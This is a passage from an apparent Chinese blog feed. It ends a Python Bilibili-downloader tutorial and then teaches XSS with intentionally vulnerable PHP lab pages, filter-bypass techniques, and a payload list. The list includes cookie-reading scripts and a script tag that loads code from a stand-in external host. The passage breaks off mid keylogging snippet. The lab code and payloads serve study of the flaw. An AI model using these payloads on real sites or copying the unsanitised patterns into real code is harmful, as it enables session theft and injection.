</span><br></pre></td></tr></table></figure><p>然后，把ffmpeg和py文件放置到同一文件夹下。</p><p>因为ffmpeg是要一起打包的，需要对代码中的相应目录做小幅修改。修改后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp3&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp3&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp4&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在合并 &quot;</span> + video_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;ffmpeg/bin/&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;%s.mp4&quot;</span>%video_name,<span class="string">&quot;../../%s.mp4&quot;</span>%video_name)</span><br><span class="line">    print(<span class="string">&quot;完成合并 &quot;</span> + video_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;输入bilibili视频对应的链接即可下载：\n&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>修改好后，cmd切换到我们刚刚放文件的目录，执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pyinstall -F -i bilibili.ico bilibili_video_download.py</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210417235918679.png" alt="image-20210417235918679"></p><p>（这里<code>-i bilibili.ico</code>是对程序的图标进行设置，为可选项）</p><p>执行完毕会发现当前目录多了几个文件夹，打开其中名为dist的文件夹，里面生成了一个名为<code>bilibili_video_download</code>的exe应用程序，并且图标也是我们设置的图案。（这里要把exe文件移动到上一级目录，即ffmpeg的同级目录）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418000736927.png" alt="image-20210418000736927"></p><p>点击运行exe应用程序，输入视频URL即可下载。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001107366.png" alt="image-20210418001107366"></p><p>下载完毕！</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001228931.png" alt="image-20210418001228931"></p><p>所有相关资源已放在下面的链接中，需要的朋友可以自取。（下载后解压此压缩包，运行<code>bilibili_video_download.exe</code>并输入视频对应链接即可完成视频下载 ）</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg">https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg</a><br>提取码：1234<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞学习</title>
      <link href="posts/54823.html"/>
      <url>posts/54823.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>XSS练习靶场</p><p>在线：</p><p><a href="https://xss.haozi.me/">https://xss.haozi.me/</a></p><p><a href="https://xssaq.com/yx/index.php">https://xssaq.com/yx/index.php</a></p><p>需下载安装：</p><p><a href="https://dvwa.co.uk/">DVWA</a></p><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a></p></blockquote><h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>跨站脚本(Cross-site Scripting )攻击，攻击者通过网站注入点注入客户端可执行解析的payload（脚本代码），当用户访问网页时，恶意payload自动加载并执行，以达到攻击者目的（窃取cookie、恶意传播、钓鱼欺骗等）。<br>为了避免CSS（层叠样式表）相混淆，通常称它为”XSS””。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型XSS非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面，在发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。这类攻击手段大多数是用来盗取用户的Cookie信息。</p><p>流程图如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094651918.png"></p><p>测试代码<code>reflected.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;反射型XSS测试&lt;h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;reflected.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $name = $_GET[&#x27;</span>name<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">    echo &quot;Hello! &quot;.$name;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个简单的用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理，再由前端显示。所以这种漏洞数据流向是： 前端–&gt;后端–&gt;前端。很明显，此过程中没有对输入的参数作任何过滤，存在XSS。<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315233801938.png" alt="image-20210315233801938"></p><p>我们可以在输入框或URL中写入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>进行测试，回车后可见xss弹窗。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234322375.png" alt="image-20210315234322375"></p><p>查看网页源代码可以发现，插入进去的js脚本被完完全全的执行了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234502018.png" alt="image-20210315234502018"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称为持久型XSS，攻击者将XSS代码发送给了服务器，而服务器没有对这些代码做任何处理就直接存储在了数据库中，当下一个用户访问网站时直接从数据库调用出来传给前端，浏览器解析XSS代码就造成了XSS攻击。常见的攻击点在个人信息、发表文章、留言板等地方。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。</p><p>流程图如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094756253.png"></p><p>测试代码<code>stored.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;存储型XSS测试&lt;h2&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;border: 1px solid&quot;</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;stored.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        name:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        comments：&lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;发表&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;p&gt;评论区：&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&quot;test&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into comment values (&#x27;<span class="subst">$_POST</span>[name]&#x27;,&#x27;<span class="subst">$_POST</span>[comment]&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;select * from comment ;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;：&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;comment&quot;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这是一个简单的评论界面，用户提交数据后保存至数据库，再由数据库中调出数据并显示再下方。显然对写入数据库的数据没有进行过滤，存在XSS。存储型XSS的数据流向是：前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端。<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317212829283.png" alt="image-20210317212829283"></p><p>在输入框（可注入位置）中插入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，然后提交。此xss代码会写入数据库，后面再访问这个页面都会执行插入的XSS代码，出现弹窗。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213645942.png" alt="image-20210317213645942"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213733557.png" alt="image-20210317213733557"></p><p>查看网页源代码可以发现，从数据库调出来的数据被浏览器执行了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214235176.png" alt="image-20210317214235176"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>也被称作本地跨站，是基于文档对象模型Document Object Model（DOM）的一种漏洞。DOM是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分。DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p><blockquote><p>可能触发DOM型XSS的属性</p><p>document.referer、window.name、location、innerHTML、documen.write</p></blockquote><p>测试代码<code>dom.php</code>,参考于<a href="https://github.com/zhuifengshaonianhanlu/pikachu">Pikachu</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;DOM型XSS测试&lt;/h2&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">            document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">            console.log(document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>它通过 getElementById 获取到了标签 Id 为 text的内容赋值给str，然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中，我们通过闭合的方式构造Payload<code>#&#39;onclick=&quot;alert(document.cookie)&quot;</code>。DOM型XSS漏洞数据流向是： 前端–&gt;浏览器。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210316010752417.png" alt="image-20210316010752417"></p><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p><strong>黑盒测试</strong></p><ol><li>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。</li><li>输入一组”特殊字符（如<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>等）+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。</li><li>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。</li><li>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。</li></ol><p><strong>Tips：</strong></p><ol><li>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；</li><li>有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行；</li><li>通过变化不同的script，尝试绕过后台的过滤机制。</li></ol><p><strong>白盒测试(代码审计)</strong></p><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p><p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p><p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p><p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p><p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p><h1 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS-payload"></a>XSS-payload</h1><p>更多可见：[<a href="https://www.cnblogs.com/-mo-/p/11229183.html">WEB安全]XSS命令总结 作者：肖洋肖恩、</a> </p><ol><li><p>若使用一些函数将构成xss代码的一些关键字符给过滤了，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;&quot;,&quot;&quot;,$name);      &#x2F;&#x2F;过滤&lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;&quot;,&quot;&quot;,$name);   &#x2F;&#x2F;过滤&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>绕过技巧：可以使用大小写绕过  <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p></li><li><p>若不区分大小写过滤标签，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);    &#x2F;&#x2F;不区分大小写过滤 &lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);  &#x2F;&#x2F;不区分大小写过滤 &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>绕过技巧：可以使用嵌套的script标签绕过  <code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p></li><li><p>若不区分大小写，过滤之间的所有内容，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F;过滤了&lt;script  及其之间的所有内容</span><br></pre></td></tr></table></figure><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。如payload： <code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p></li></ol><p>一些常用的XSS攻击载荷：</p><ul><li><code>&lt;script&gt;标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  #正常截断</span><br><span class="line">&lt;script&gt;alert(\&#39;hack\&#39;)&lt;&#x2F;script&gt;  #数据提交至数据库时有时引号需要转义 </span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;      #弹出cookie</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #引用外部的xss</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  οnerrοr&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  οnerrοr&#x3D;alert(document.cookie)&gt; </span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;body&gt;标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><ul><li><code>video标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart&#x3D;alert(1) src&#x3D;&quot;&#x2F;media&#x2F;hack-the-planet.mp4&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>style标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style οnlοad&#x3D;alert(1)&gt;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><ul><li><code>监听键盘onkeydown事件</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown&#x3D;funciont(e)&#123;</span><br><span class="line">if(!e)e&#x3D;window.event;</span><br><span 